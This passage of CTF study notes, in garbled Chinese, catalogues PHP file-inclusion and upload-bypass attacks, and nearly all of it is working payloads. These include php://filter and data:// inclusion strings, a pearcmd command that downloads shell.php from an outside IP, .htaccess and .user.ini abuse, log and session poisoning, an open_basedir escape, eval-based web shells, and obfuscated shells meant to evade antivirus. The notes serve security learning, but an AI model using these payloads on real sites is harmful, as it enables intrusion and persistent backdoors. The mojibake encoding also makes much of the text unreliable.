?file=php://filter/write=string.rot13/resource=1.php</code></li><li><code>?file=%25%37%30%25%36%38%25%37%30%25%33%61%25%32%66%25%32%66%25%36%36%25%36%39%25%36%63%25%37%34%25%36%35%25%37%32%25%32%66%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%33%64%25%37%33%25%37%34%25%37%32%25%36%39%25%36%65%25%36%37%25%32%65%25%37%32%25%36%66%25%37%34%25%33%31%25%33%33%25%32%66%25%37%32%25%36%35%25%37%33%25%36%66%25%37%35%25%37%32%25%36%33%25%36%35%25%33%64%25%33%32%25%32%65%25%37%30%25%36%38%25%37%30</code></li></ul></li></ul></li><li><p>éœ€è¦ Rot13 ç¼–ç ï¼š</p><ul><li><code>POST: content=&lt;?php system(&#39;cat f*&#39;);</code></li><li><code>content=&lt;?cuc cucvasb();?&gt;</code></li></ul></li><li><p>æˆ–ï¼š</p><ul><li><code>?file=php://filter/write=string.strip_tags|convert.base64-decode/resource=3.php</code></li><li><code>/?file=%25%37%30%25%36%38%25%37%30%25%33%61%25%32%66%25%32%66%25%36%36%25%36%39%25%36%63%25%37%34%25%36%35%25%37%32%25%32%66%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%33%64%25%37%33%25%37%34%25%37%32%25%36%39%25%36%65%25%36%37%25%32%65%25%37%33%25%37%34%25%37%32%25%36%39%25%37%30%25%35%66%25%37%34%25%36%31%25%36%37%25%37%33%25%37%63%25%36%33%25%36%66%25%36%65%25%37%36%25%36%35%25%37%32%25%37%34%25%32%65%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%64%25%36%34%25%36%35%25%36%33%25%36%66%25%36%34%25%36%35%25%32%66%25%37%32%25%36%35%25%37%33%25%36%66%25%37%35%25%37%32%25%36%33%25%36%35%25%33%64%25%33%33%25%32%65%25%37%30%25%36%38%25%37%30</code></li><li><code>postä¼ å…¥ &lt;?php phpinfo();</code></li><li><code>PD9waHAgcGhwaW5mbygpOw==</code></li></ul></li><li><p>æˆ–ï¼š</p><ul><li><code>file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=a.php</code></li><li><code>post: contents=?&lt;hp pvela$(P_SO[T]1;)&gt;?</code></li></ul><p>åˆ©ç”¨filteré“¾æ„é€ çš„æ–¹å¼æ„é€ ä»»æ„å­—ç¬¦</p><p>â€‹<a href="https://probiusofficial.github.io/PHP-FilterChain-Exploit/">PHP FilterChain ç”Ÿæˆå™¨ (probiusofficial.github.io)</a></p></li></ul><h1 id="æ–‡ä»¶åŒ…å«é…åˆä¼ªåè®®"><a href="#æ–‡ä»¶åŒ…å«é…åˆä¼ªåè®®" class="headerlink" title="æ–‡ä»¶åŒ…å«é…åˆä¼ªåè®®"></a>æ–‡ä»¶åŒ…å«é…åˆä¼ªåè®®</h1><ul><li><code>include($file)</code></li><li>ç¤ºä¾‹ï¼š<ul><li><code>?file=php://filter/convert.base64-encode/resource=flag.php</code></li><li><code>?file=php://filter/convert.%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%44%25%36%35%25%36%45%25%36%33%25%36%46%25%36%34%25%36%35/resource=flag.php   //äºŒæ¬¡ç¼–ç è§£å¾ˆå¤šé¢˜</code></li><li><code>?data://text/plain,&lt;?php system(&#39;ls&#39;);?&gt;</code></li><li><code>?file=data://text/plain;base64,PD89c3lzdGVtKCd0YWMgZmxhZy5waHAnKTs/Pg==   //&lt;?=system(&#39;tac flag.php&#39;);?&gt;</code></li><li><code>?file=php://filter/convert.iconv.ASCII.UCS-2BE/resource=flag.php</code></li><li><code>?file=compress.zlib:///var/www/html/flag.php</code></li><li><code>compress.zlib://data:@baidu.com/baidu.com,phpinfo() æ„é€ æ€è·¯ï¼š</code>@<code>ä½¿</code>data:<code>è¢«è§£é‡Šä¸ºç”¨æˆ·åå’Œå¯†ç  baidu.com/baidu.com åªè¦å®ƒåŒ…å«äº† /ï¼Œé€šå¸¸è¢«è®¤ä¸ºæ˜¯åˆæ³•çš„ media-typeã€‚ä½œä¸ºæœ‰æ•ˆçš„å‹ç¼©æµï¼Œè€Œæ˜¯å°†æ•´ä¸ª URL ä½œä¸ºå­—é¢æ–‡æœ¬è¯»å–äº†ã€‚file_get_contentsç»“æœæ˜¯phpinfo()</code></li><li><code>?file=phar://test.zip/shell.txt   //ç›¸å¯¹è·¯å¾„ pharæŠŠshell.txtå‹ç¼©æˆtest.zipæ–‡ä»¶</code></li></ul></li></ul><h1 id="åŒ…å«-htaccess-æ–‡ä»¶"><a href="#åŒ…å«-htaccess-æ–‡ä»¶" class="headerlink" title="åŒ…å« .htaccess æ–‡ä»¶"></a>åŒ…å« .htaccess æ–‡ä»¶</h1><ul><li>ç¤ºä¾‹ï¼š<ul><li><code>php_value auto_append_file /tmp/webshell.txt</code></li><li><code>php_value auto_append_file /temp/sess_xxxxxx</code></li><li><code>å…ˆæ‰§è¡Œå…¶ä»–phpå®Œå†åŒ…å«/tmp/webshell</code></li><li><code>è‡ªå·±åŒ…å«è‡ªå·±ä¼šå°†æ³¨é‡Šå¥å­ä¸€èµ·æ‰§è¡Œ</code></li><li><code>php_value auto_append_file .htaccess</code></li><li><code>#&lt;?php echo(123);eval($_POST[0]);?&gt;</code></li></ul></li></ul><h1 id="è§åˆ°-shtml-è€ƒè™‘-ssi"><a href="#è§åˆ°-shtml-è€ƒè™‘-ssi" class="headerlink" title="è§åˆ° shtml è€ƒè™‘ ssi"></a>è§åˆ° shtml è€ƒè™‘ ssi</h1><ul><li>ç¤ºä¾‹ï¼š<ul><li><code>.htaccess</code></li><li><code>AddType text/html .shtml</code></li><li><code>AddHandler server_parsed .shtml</code></li><li><code>Options Includes</code></li><li><code>1.shtml</code></li><li><code>&lt;pre&gt;</code></li><li><code>&lt;!--#exec cmd=&quot;whomai&quot;--&gt;</code></li><li><code>&lt;/pre&gt;</code></li></ul></li></ul><h1 id="ä¼ ç»Ÿæ¡ä»¶ç«äº‰ä¸å¯å–"><a href="#ä¼ ç»Ÿæ¡ä»¶ç«äº‰ä¸å¯å–" class="headerlink" title="ä¼ ç»Ÿæ¡ä»¶ç«äº‰ä¸å¯å–"></a>ä¼ ç»Ÿæ¡ä»¶ç«äº‰ä¸å¯å–</h1><ul><li>ç¤ºä¾‹ï¼š<ul><li><code>æ¡ä»¶ç«äº‰php7.0</code></li><li><code>file=php://filter/strip_tags/resource=/ect/passwd  ä¼šæŠ¥é”™ä¸æ‰§è¡Œ</code></li><li><code>postä¼ æ–‡ä»¶å°±ç›´æ¥æ°¸ä¹…ä¿å­˜ä¸‹æ¥ï¼Œåœ¨phpinfoç•Œé¢æ‰¾fileåŒ…å«å³å¯</code></li><li><code>è‡ªåŒ…å«(é¢˜ä¸­çš„åŒ…å«æˆ–è€….htaccessåŒ…å« php_value auto_append_file 1.txt)ï¼Œä¸Šä¼ ï¼Œphpinfoé¡µé¢ï¼Œè¿™å‡ ä¸ªä¿è¯åœ¨ä¸€ä¸ªç•Œé¢ï¼Œåœ¨è‡ªåŒ…å«ä¸‹ç»™phpinfoç•Œé¢ä¼ æ–‡ä»¶ï¼Œ</code></li><li><code>è‡ªåŒ…å«shell</code></li><li><code>1.txt</code></li><li><code>&lt;?</code></li><li><code>echo (&#39;1.txt is ready&#39;);</code></li><li><code>file_put_contents(&#39;/tmp/shell.php&#39;,&#39;&lt;?php echo(&#39;haha,is OK&#39;);eval($_POST[0]);?&gt;&#39;);</code></li></ul></li></ul><h1 id="æ—¥å¿—æ–‡ä»¶åŒ…å«"><a href="#æ—¥å¿—æ–‡ä»¶åŒ…å«" class="headerlink" title="æ—¥å¿—æ–‡ä»¶åŒ…å«"></a>æ—¥å¿—æ–‡ä»¶åŒ…å«</h1><ul><li>ç¤ºä¾‹ï¼š<ul><li><code>/var/log/nginx/access.logï¼Œåˆ©ç”¨uaå¤´å³å¯åŒ…å«</code></li></ul></li></ul><h1 id="åŒ…å«-environ-æ–‡ä»¶"><a href="#åŒ…å«-environ-æ–‡ä»¶" class="headerlink" title="åŒ…å« environ æ–‡ä»¶"></a>åŒ…å« environ æ–‡ä»¶</h1><ul><li>æ¡ä»¶ï¼š<ul><li><code>phpä»¥cgiæ–¹å¼è¿è¡Œï¼Œè¿™æ ·environæ‰ä¼šä¿æŒUAå¤´ã€‚</code></li><li><code>environæ–‡ä»¶å­˜å‚¨ä½ç½®å·²çŸ¥ï¼Œä¸”environæ–‡ä»¶å¯è¯»ã€‚</code></li><li><code>æ¯ä¸ªç”¨æˆ·éƒ½æœ‰å±äºè‡ªå·±çš„environç¯å¢ƒ</code></li></ul></li></ul><h1 id="session-æ–‡ä»¶åŒ…å«"><a href="#session-æ–‡ä»¶åŒ…å«" class="headerlink" title="session æ–‡ä»¶åŒ…å«"></a>session æ–‡ä»¶åŒ…å«</h1><ul><li>ç¤ºä¾‹ï¼š<ul><li><code>èƒ½èµ‹å€¼å°±ç›´æ¥èµ‹å€¼åŒ…å«</code></li><li><code>ä¸è¡Œå°±è¿›åº¦æ¡</code></li><li><code>/tem/sess_PHPSESSID</code></li><li><code>/var/lib/php/session/sess_PHPSESSID</code></li><li><code>è¿™é‡Œçš„PHPSESSIDæ˜¯cookieå½“ç”¨æˆ·æ§åˆ¶æ—¶ï¼ˆsession.use_struct_modeå¼€ï¼‰éšä¾¿å†™å…¥ï¼Œåˆ©ç”¨sessionè¿›åº¦æ¡ï¼Œåˆ©ç”¨å†™çš„HTMLï¼Œéšä¾¿ä¼ æŠ“åŒ…ï¼Œç¡®ä¿æœ‰Cookie: PHPSESSID=xxxxxxxå¹¶æ‰¾åˆ°å…¶ä½ç½®  /sess_xxxxxx</code></li><li><code>é»˜è®¤æ˜¯ä¸€ç›´åˆ é™¤ï¼Œæ‰€ä»¥ä¸€ç›´é‡å‘sessioné¡µé¢çš„åŒ…ï¼Œå¹¶ä¸”ä¸€ç›´é‡å‘åŒ…å«sessionæ–‡ä»¶çš„é¡µé¢åŒ…å«è¿›å»</code></li></ul></li></ul><h1 id="pear-æ–‡ä»¶åŒ…å«"><a href="#pear-æ–‡ä»¶åŒ…å«" class="headerlink" title="pear æ–‡ä»¶åŒ…å«"></a>pear æ–‡ä»¶åŒ…å«</h1><ul><li>æ¡ä»¶ï¼š<ul><li><code>1 æœ‰æ–‡ä»¶åŒ…å«ç‚¹</code></li><li><code>2 å¼€å¯äº†pearæ‰©å±•</code></li><li><code>3 é…ç½®æ–‡ä»¶ä¸­register_argc_argv è®¾ç½®ä¸ºOn,è€Œé»˜è®¤ä¸ºOff</code></li></ul></li><li>è¯´æ˜ï¼š<ul><li><code>PEARæ‰©å±•</code></li><li><code>PHP Extension and Application Repository</code></li><li><code>é»˜è®¤å®‰è£…ä½ç½®æ˜¯  /usr/local/lib/php/</code></li><li><code>åŒ…å«æµ‹è¯•?file=/usr/local/lib/php/pearcmd.php&amp;version</code></li></ul></li><li>åˆ©ç”¨ Pear æ‰©å±•è¿›è¡Œæ–‡ä»¶åŒ…å«<ul><li>pageå‚æ•°å­˜åœ¨æ–‡ä»¶åŒ…å«ï¼Œé¢˜ç›®æç¤ºå¾ˆæ˜æ˜¾ï¼Œregister_argc_argvï¼Œæ‰€ä»¥æ‰“pearcmdåŒ…å«</li><li>æ–¹æ³•ä¸€ è¿œç¨‹æ–‡ä»¶ä¸‹è½½<ul><li>ç¤ºä¾‹ï¼š<ul><li><code>?file=/usr/local/lib/php/pearcmd.php&amp;ctfshow+install+-R+/var/www/html/+http://47.236.120.83/shell.php  //shellå¯†ç æ˜¯cmd</code></li></ul></li></ul></li><li>æ–¹æ³•äºŒ ç”Ÿæˆé…ç½®æ–‡ä»¶ï¼Œé…ç½®é¡¹ä¼ å…¥æˆ‘ä»¬æ¶æ„çš„phpä»£ç çš„å½¢å¼<ul><li>ä¸Šä¼  <code>ctfshow.php</code><ul><li>ç¤ºä¾‹ï¼š<ul><li><code>a=b</code></li><li><code>username=root</code></li><li><code>man_dir=&lt;?php eval($_POST[1]);?&gt;</code></li></ul></li><li>ç¤ºä¾‹ï¼š<ul><li><code>GET /?file=/usr/local/lib/php/pearcmd.php&amp;+-c+/tmp/ctf.php+-d+man_dir=&lt;?eval($_POST[1]);?&gt;+-s+</code></li></ul></li><li>ç„¶åç›´æ¥åˆ©ç”¨å¯†ç æ˜¯1</li><li>?page&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;pearcmd.php&amp;+config-create+&#x2F;tmp&#x2F;<?=system('/readflag')?>&#x2F;*+&#x2F;tmp&#x2F;pwn.php</li><li>ä¹‹åè®¿é—®?page&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;tmp&#x2F;pwn.php</li></ul></li></ul></li><li>æ–¹æ³•ä¸‰ å†™é…ç½®æ–‡ä»¶æ–¹å¼<ul><li>ç¤ºä¾‹ï¼š<ul><li><code>GET /?file=/usr/local/lib/php/pearcmd.php&amp;aaaa+config-create+/var/www/html/&lt;?=</code>$_POST[1]<code>;?&gt;+1.php</code></li><li>è®¿é—® <code>http://&lt;é¶åœºæœåŠ¡å™¨IP&gt;/1.php</code></li></ul></li></ul></li></ul></li></ul><h1 id="è¿œç¨‹æ–‡ä»¶åŒ…å«"><a href="#è¿œç¨‹æ–‡ä»¶åŒ…å«" class="headerlink" title="è¿œç¨‹æ–‡ä»¶åŒ…å«"></a>è¿œç¨‹æ–‡ä»¶åŒ…å«</h1><ul><li>è¯´æ˜ï¼š<ul><li>é€šè¿‡åŸŸè½¬æ•°å­—çš„å½¢å¼ï¼Œå¯ä»¥ä¸ç”¨.æ¥æ„é€ è¿œç¨‹æ–‡ä»¶åœ°å€</li><li>ç¤ºä¾‹ï¼š<ul><li><code>http://www.msxindl.com/tools/ip/ip_num.asp</code></li><li><code>?file=http://731540450/1</code></li></ul></li></ul></li></ul><h1 id="open-basedir-çªç ´"><a href="#open-basedir-çªç ´" class="headerlink" title="open_basedir çªç ´"></a>open_basedir çªç ´</h1><ul><li>è¯´æ˜ï¼š<ul><li>åˆ©ç”¨é—­åˆç›´æ¥ <code>glob</code> è·å–æ ¹ç›®å½•çš„æ–‡ä»¶å</li><li>ç¤ºä¾‹ï¼š<ul><li><code>?&gt;&lt;?php</code></li><li><code>var_dump(scandir(&#39;glob:///*&#39;));?&gt;</code></li></ul></li></ul></li><li>æˆ–è€…åˆ©ç”¨ <code>glob+DirectoryIterator</code> è·å–æ ¹ç›®å½•çš„æ–‡ä»¶åï¼Œæ–°å»º <code>glob.php</code> æ–‡ä»¶ï¼Œå†…å®¹å¦‚ä¸‹<ul><li>ç¤ºä¾‹ï¼š<ul><li><code>&lt;?php</code></li><li><code>$it = new DirectoryIterator(&quot;glob:///*&quot;);</code></li><li><code>foreach($it as $f) &#123;</code></li><li><code>echo $f-&gt;__toString().&quot;&lt;br/&gt;&quot;;</code></li><li><code>&#125;</code></li><li><code>ç›´æ¥é€šè¿‡èšå‰‘é“¾æ¥ï¼Œå°†glob.phpä¸Šä¼ å†è®¿é—®æ‰¾åˆ°flagå</code></li></ul></li></ul></li><li>åˆ©ç”¨ <code>ini_setã€mkdirã€chdir</code> æ¥è·å–æ–‡ä»¶å†…å®¹ï¼Œæ–°å»º <code>flag.php</code> æ–‡ä»¶ï¼Œå†…å®¹å¦‚ä¸‹<ul><li>ç¤ºä¾‹ï¼š<ul><li><code>&lt;?php</code></li><li><code>mkdir(&#39;tmpdir&#39;); chdir(&#39;tmpdir&#39;);</code></li><li><code>ini_set(&#39;open_basedir&#39;,&#39;..&#39;);</code></li><li><code>chdir(&#39;..&#39;); chdir(&#39;..&#39;); chdir(&#39;..&#39;); chdir(&#39;..&#39;); chdir(&#39;..&#39;);</code></li><li><code>ini_set(&#39;open_basedir&#39;,&#39;/&#39;);</code></li><li><code>$a=file_get_contents(&#39;/f11aggg&#39;);</code></li><li><code>var_dump($a);</code></li><li><code>?&gt;</code></li><li>è®¿é—®å³å¯å¾—åˆ°flag</li></ul></li></ul></li></ul><h1 id="nginx-å¤§æ–‡ä»¶ä¸Šä¼ ç¼“å­˜æ–‡ä»¶åˆ©ç”¨"><a href="#nginx-å¤§æ–‡ä»¶ä¸Šä¼ ç¼“å­˜æ–‡ä»¶åˆ©ç”¨" class="headerlink" title="nginx å¤§æ–‡ä»¶ä¸Šä¼ ç¼“å­˜æ–‡ä»¶åˆ©ç”¨"></a>nginx å¤§æ–‡ä»¶ä¸Šä¼ ç¼“å­˜æ–‡ä»¶åˆ©ç”¨</h1><h1 id="pcache-æ‰©å±•ç”Ÿæˆç¼“å­˜æ–‡ä»¶åˆ©ç”¨"><a href="#pcache-æ‰©å±•ç”Ÿæˆç¼“å­˜æ–‡ä»¶åˆ©ç”¨" class="headerlink" title="pcache æ‰©å±•ç”Ÿæˆç¼“å­˜æ–‡ä»¶åˆ©ç”¨"></a>pcache æ‰©å±•ç”Ÿæˆç¼“å­˜æ–‡ä»¶åˆ©ç”¨</h1><ul><li>æœ‰ä»»æ„æ–‡ä»¶è¯»å–ï¼Œå‰é¢åŒå†™ç»•è¿‡&#x2F;.çš„è¿‡æ»¤</li><li>ç¤ºä¾‹ï¼š<ul><li><code>/?tpl=...//...//...//...//...//...//...//...//etc/passwd</code></li></ul></li><li>flag åœ¨ <code>flag.php</code> é‡Œï¼Œæºç å¯¹æœ€åä¸€ä¸ª.åçš„åç¼€åè¿›è¡Œåˆ¤æ–­ï¼Œæ— æ³•ç›´æ¥ç»•è¿‡è¯»å–flag.phpï¼ŒæŸ¥çœ‹phpinfo</li><li>ç¤ºä¾‹ï¼š<ul><li><code>/?tpl=debug</code></li><li><code>å‘ç°å¼€å¯äº†opcacheï¼Œå®ƒä¼šç¼“å­˜phpæ–‡ä»¶è¿›å…¥æŒ‡å®šç¼“å­˜æ–‡ä»¶å¤¹ï¼Œè·¯å¾„ä¸ºç¼“å­˜æ–‡ä»¶å¤¹/[system_id]/var/www/html/flag.php.bin</code></li><li>åªè¦è®¿é—®è¿™ä¸ªbinæ–‡ä»¶å³å¯ç»•è¿‡åç¼€è¿‡æ»¤ï¼ŒæŸ¥çœ‹phpinfoå‘ç°ç¼“å­˜æ–‡ä»¶å¤¹ä¸º <code>/var/www/a/</code></li><li>ä¸»è¦æ˜¯è®¡ç®— <code>system_id</code>ï¼Œæœ‰ç°æˆå·¥å…· <code>php7-opcache-override(https://github.com/GoSecure/php7-opcache-override)</code></li><li><code>ç”¨æ³•ï¼š</code><ul><li><code>python3 system_id_scraper.py info.html æˆ–è€… python3 system_id_scraper.py url</code></li><li><code># info.htmlä¸ºphpinfoçš„å‰ç«¯ä¿¡æ¯ç•Œé¢å¦å­˜ä¸ºæ‰€å¾—</code></li><li><code># urlä¸ºphpinfoåœ°å€</code></li><li>ç¤ºä¾‹ï¼š<ul><li><code>ç®—å‡ºsystem_idä¸º1116d566fdc53f79abce6c01e3a0308d</code></li><li><code>æ‰€ä»¥å…ˆè®¿é—®flag.phpä½¿å…¶äº§ç”Ÿç¼“å­˜æ–‡ä»¶ï¼ˆè¿™ä¸€æ­¥å¿…é¡»è¦ï¼‰ï¼Œä¹‹åæ‰§è¡Œè®¿é—®å¦‚ä¸‹è¿›è¡ŒåŒ…å«å³å¯</code></li><li><code>/?tpl=...//...//...//...//...//...//...//...//var/www/a/1116d566fdc53f79abce6c01e3a0308d/var/www/html/flag.php.bin</code></li><li><code>#flag&#123;Opcache_Succ_ess!!&#125;</code></li></ul></li></ul></li></ul></li></ul><hr><h1 id="æ–‡ä»¶ä¸Šä¼ "><a href="#æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="æ–‡ä»¶ä¸Šä¼ "></a>æ–‡ä»¶ä¸Šä¼ </h1><h2 id=""><a href="#" class="headerlink" title="&lt;?php çš„ç»•è¿‡"></a><code>&lt;?php</code> çš„ç»•è¿‡</h2><ul><li>ç¤ºä¾‹ï¼š<ul><li><code>&lt;?=</code> </li><li><code>&lt;script language=&#39;php&#39;&gt;phpinfo();&lt;/script&gt;</code></li><li><code>&lt;% phpinfo();%&gt; //asp tagå°‘</code></li></ul></li><li>æ€è·¯æ˜¯æ‰¾è¿‡æ»¤ï¼Œæ˜¯å†…å®¹è¿˜æ˜¯åç¼€ï¼Œæ˜¯ç™½è¿˜æ˜¯é»‘</li></ul><h2 id="å‰ç«¯-js-æ£€æŸ¥"><a href="#å‰ç«¯-js-æ£€æŸ¥" class="headerlink" title="å‰ç«¯ js æ£€æŸ¥"></a>å‰ç«¯ js æ£€æŸ¥</h2><ul><li>ç¤ºä¾‹ï¼š<ul><li>åæ”¹ä¸º bp</li><li>å›¾ç‰‡å¤´ <code>GIF89A</code> ä¸ºç¬¬ä¸€è¡Œ</li><li>åŠ å…¥å¸¦é©¬çš„å›¾ç‰‡</li></ul></li></ul><h3 id="shell-æ€»ç»“"><a href="#shell-æ€»ç»“" class="headerlink" title="shell æ€»ç»“"></a>shell æ€»ç»“</h3><ul><li>ç¤ºä¾‹ï¼š<ul><li><code>&lt;?echo (&#39;123&#39;);eval($_POST[0]);?&gt;</code></li><li><code>&lt;?=eval($_POST&#123;1&#125;);?&gt; //è¿‡æ»¤[]</code></li><li><code>&lt;?=system(&#39;tac ../f*&#39;)?&gt; //è¿‡æ»¤&#123;&#125;[]</code></li><li><code>&lt;script language=â€phpâ€&gt;echo &#39;123&#39;; &lt;/script&gt;</code></li><li><code>&lt;?= eval(array_pop($_REQUEST))?&gt;</code></li><li><code>&lt;?= @eval(array_pop($_POST))?&gt; //ä¼ 1=system(&#39;ls /&#39;)</code></li><li>ä¸Šä¼ å®Œshellæ— è®ºæ˜¯jpgè¿˜æ˜¯phpç›´æ¥åŒ…å«</li><li>ç¤ºä¾‹ï¼š<ul><li><code>?file=upload/1.jpg&amp;0=tac%20Flag_is_here_acffd72.php</code></li></ul></li></ul></li></ul><h2 id="é»‘åå•ç»•è¿‡"><a href="#é»‘åå•ç»•è¿‡" class="headerlink" title="é»‘åå•ç»•è¿‡"></a>é»‘åå•ç»•è¿‡</h2><ul><li>ç¤ºä¾‹ï¼š<ul><li><code>åˆ©ç”¨fuzzæ–¹æ³•å¿«é€Ÿæµ‹è¯•å¯ä¸Šä¼ åç¼€ï¼šupload-fuzz-dic-builder()</code></li><li>é¡¹ç›®åœ°å€ï¼š<a href="https://github.com/c0ny1/upload-fuzz-dic-builder">https://github.com/c0ny1/upload-fuzz-dic-builder</a></li><li>ç”¨æ³•ï¼š<code>python2 upload-fuzz-dic-builder.py -n shell -a jpg  -l php -m apache --os linux  -o upload_file.txt</code></li><li>åŒå†™ï¼š<ul><li>phpåç¼€åå¤§å°å†™ã€ç‚¹ç»•è¿‡ã€ç©ºæ ¼ç»•è¿‡ã€::$DATAç»•è¿‡ã€å†’å·ç»•è¿‡ï¼ˆWindowsç‰¹æ€§ï¼‰</li><li>phpæ”¯æŒçš„å¯è§£æåˆ«åï¼šphp2, php3, php4, php5, phps, pht, phtm, phtml</li></ul></li></ul></li><li><code>.user.ini</code> ä¸Šä¼ ï¼Œå…ˆå‘å›¾ç‰‡å†æ”¹ä¸ºè¿™ä¸ª <code>.user.ini</code> åå­—<ul><li>ä½†æ˜¯è¿™ç§æ–¹å¼å…¶å®æ˜¯æœ‰ä¸ªå‰æçš„ï¼Œå› ä¸º <code>.user.ini</code> åªå¯¹ä»–åŒä¸€ç›®å½•ä¸‹çš„æ–‡ä»¶èµ·ä½œç”¨ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œåªæœ‰ä»–åŒç›®å½•ä¸‹æœ‰phpæ–‡ä»¶æ‰å¯ä»¥ã€‚</li><li>ç¤ºä¾‹ï¼š<ul><li><code>1.å†™å…¥å†…å®¹auto_prepend_file=1.txt å†ä¸Šä¼ 1.txtçš„é©¬ä¸è¡Œå°±å†™&lt;?=eval($_COOKIE[1]); ä¼ COOKIEï¼š1=eval(base64_decode(&#39;cGhwaW5mbygpOw==&#39;))?&gt;</code></li><li><code>2.å†™å…¥å†…å®¹auto_prepend_file=php://input</code></li><li><code>ä¸Šä¼ å®Œç›´æ¥éšä¾¿å‘ä¸ªä¸œè¥¿åœ¨bpç›´æ¥ä¼ ç å°±è¡Œ</code></li><li><code>3.å†™å…¥å†…å®¹auto_prepend_file=/var/log/nginx/access.log</code></li><li><code>ä¸Šä¼ åuaå†™ç &lt;?php eval($_POST[1]);?&gt;æœ¨é©¬ï¼Œæ’å…¥æ—¥å¿—åå°±ä¸å†™uaå¤´ç›´æ¥rceå°±è¡Œï¼ŒPOSTä¸è¡Œå°±COOKIE&lt;?php eval($_COOKIE[1]);?&gt; 1=eval(base64_decode(&#39;&#39;))?&gt;COOKIEä¸è§£æç©ºæ ¼</code></li><li><code>4..user.iniå†™å…¥å†…å®¹</code></li><li><code>GIF89a</code></li><li><code>auto_prepend_file=/tmp/sess_shell</code></li><li><code>ç”¨sessionè¿›åº¦æ¡postå‘åŒ…å¹¶æ‹¦æˆªï¼Œé©¬æ˜¯&lt;?php @eval($_POST[&quot;pass&quot;]);?&gt;</code></li><li><code>æ”¹Cookie:PHPSESSID=shell,åœ¨PHP_SESSION_UPLOAD_PROGRESSçš„ä¸»ä½“çš„æœ€åä¸€è¡Œå†™&lt;?php fwrite(fopen(&#39;1.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_POST[&quot;pass&quot;]);?&gt;&#39;);?&gt;</code></li><li><code>å°†è¯¥POSTæ•°æ®åŒ…ä¸è®¿é—®uploadç›®å½•çš„GETæ•°æ®åŒ…è¿›è¡Œæ¡ä»¶ç«äº‰ï¼Œè®¿é—®uploadçš„æ•°æ®åŒ…é•¿åº¦å‘ç”Ÿå˜åŒ–å³åˆ›å»ºåé—¨æ–‡ä»¶æˆåŠŸ</code></li></ul></li></ul></li><li><code>.htaccess</code> æ–‡ä»¶<ul><li>æ–¹å¼1ï¼š<ul><li><code>AddType application/x-httpd-php .png   //å°†.pngåç¼€çš„æ–‡ä»¶è§£æ æˆphp</code></li><li>è¿˜æ”¯æŒ <code>AddType application/x-httpd-ph\p .png</code></li></ul></li><li>æ–¹å¼2ï¼š<ul><li><code>&lt;FilesMatch &quot;png&quot;&gt;</code></li><li><code>SetHandler application/x-httpd-php</code></li><li><code>&lt;/FilesMatch&gt;</code></li><li>å¦‚æœflagä¸æ˜¯phpæ–‡ä»¶ï¼Œé‚£ä¹ˆè¿˜å¯ä»¥åƒ <code>.user.ini</code> ä¸€æ ·åœ¨å½“å‰ç›®å½•åŠ è½½ä¸€ä¸ªæ–‡ä»¶</li><li>ç¤ºä¾‹ï¼š<ul><li><code>php_value auto_append_file &#39;flag&#39;</code></li></ul></li></ul></li><li>åŸºäº <code>.htaccess</code> çš„ç›²æ³¨</li></ul></li></ul><h2 id="åŸºç¡€å…æ€"><a href="#åŸºç¡€å…æ€" class="headerlink" title="åŸºç¡€å…æ€"></a>åŸºç¡€å…æ€</h2><ul><li>ç¤ºä¾‹ï¼š<ul><li><code>&lt;?php</code></li><li><code>$a = &quot;s#y#s#t#e#m&quot;;</code></li><li><code>$b = explode(&quot;#&quot;,$a);</code></li><li><code>$c = $b[0].$b[1].$b[2].$b[3].$b[4].$b[5];</code></li><li><code>$c($_REQUEST[1]);</code></li><li><code>?&gt;</code></li></ul></li><li>ç¤ºä¾‹ï¼š<ul><li><code>&lt;?php</code></li><li><code>$a=substr(&#39;1s&#39;,1).&#39;ystem&#39;;</code></li><li><code>$a($_REQUEST[1]);</code></li><li><code>?&gt;</code></li></ul></li><li>ç¤ºä¾‹ï¼š<ul><li><code>&lt;?php</code></li><li><code>$a=strrev(&#39;metsys&#39;);</code></li><li><code>$a($_REQUEST[1]);</code></li><li><code>?&gt;</code></li></ul></li><li>ç¤ºä¾‹ï¼š<ul><li><code>&lt;?php</code></li><li><code>$a=$_REQUEST[&#39;a&#39;];</code></li><li><code>$b=$_REQUEST[&#39;b&#39;];</code></li><li><code>$a($b);</code></li><li><code>?&gt;</code></li></ul></li><li>å›¾åƒæ£€æµ‹å‡½æ•°<ul><li><code>mime_content_type</code></li><li><code>getimagesizeå’Œexif_imagetypeå‡½æ•°</code><ul><li>ä»¥ä¸Š3ä¸ªå‡½æ•°éƒ½æ˜¯é€šè¿‡æ£€æŸ¥æ–‡ä»¶çš„å¹»æ•°åˆ¤æ–­æ–‡ä»¶çš„ç±»åˆ«ã€‚å¯ä»¥ç›´æ¥ä¸‹åˆ—å‘½ä»¤åˆ¶ä½œåé—¨jpgæ–‡ä»¶è¿›è¡Œç»•è¿‡ã€‚</li><li>ç¤ºä¾‹ï¼š<ul><li><code>æ‰“å¼€ cmdï¼Œå¯¼èˆªåˆ°åŒ…å« safe.jpg å’Œ shell.php æ–‡ä»¶çš„ç›®å½•ï¼Œç„¶åè¿è¡Œå‘½ä»¤</code></li><li><code>copy safe.jpg /b + shell.php /a shell.jpg</code></li></ul></li></ul></li></ul></li></ul><h2 id="æ–‡ä»¶ç§»åŠ¨å‡½æ•°"><a href="#æ–‡ä»¶ç§»åŠ¨å‡½æ•°" class="headerlink" title="æ–‡ä»¶ç§»åŠ¨å‡½æ•°"></a>æ–‡ä»¶ç§»åŠ¨å‡½æ•°</h2><ul><li>ç¤ºä¾‹ï¼š<ul><li><code>move_uploaded_fileå‡½æ•°ä¼šå¿½ç•¥æ‰æ–‡ä»¶æœ«å°¾çš„/.</code></li></ul></li></ul><h2 id="ç™½åå•"><a href="#ç™½åå•" class="headerlink" 